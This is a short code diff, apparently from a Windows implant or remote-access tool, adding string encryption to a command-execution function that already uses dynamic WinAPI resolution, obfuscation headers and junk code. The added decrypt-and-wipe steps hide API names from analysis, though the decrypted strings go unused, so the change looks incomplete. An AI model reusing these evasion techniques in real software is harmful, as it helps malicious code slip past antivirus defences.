@@ -4,6 +4,7 @@
 #include "winapi_function_signatures.h"
 #include "winapi_obfuscation.h"
 #include "junk_codes.h"
+#include "string_encryption.h"
 
 namespace {
 	std::string GetLastErrorAsString()
@@ -53,6 +54,11 @@ namespace {
 
 std::string exec(std::string command)
 {
+	std::string CreatePipe_string = "";
+	std::string SetHandleInformation_string = "";
+	std::string ReadFile_string = "";
+	std::string CloseHandle_string = "";
+
 	SECURITY_ATTRIBUTES securityAttr;
 
 	HANDLE stdOutWrite = nullptr;
@@ -66,13 +72,17 @@ std::string exec(std::string command)
 	securityAttr.lpSecurityDescriptor = NULL;
 
 	// Create an STDOUT Pipe for the child process
+	CreatePipe_string = string_decrypt(str_CreatePipe, str_CreatePipe_len);
 	if (!resolve_dynamically<CreatePipe_t>("CreatePipe")(&stdOutRead, &stdOutWrite, &securityAttr, 0)) {
 		return "Error - CreatePipe() failed: " + GetLastErrorAsString();
 	}
+	wipeStr(CreatePipe_string);
 
+	SetHandleInformation_string = string_decrypt(str_SetHandleInformation, str_SetHandleInformation_len);
 	if (!resolve_dynamically<SetHandleInformation_t>("SetHandleInformation")(stdOutRead, HANDLE_FLAG_INHERIT, 0)) {
 		return "Error - SetHandleInformation() failed: " + GetLastErrorAsString();
 	}
+	wipeStr(SetHandleInformation_string);
 
 	// Create the child process
 	try {
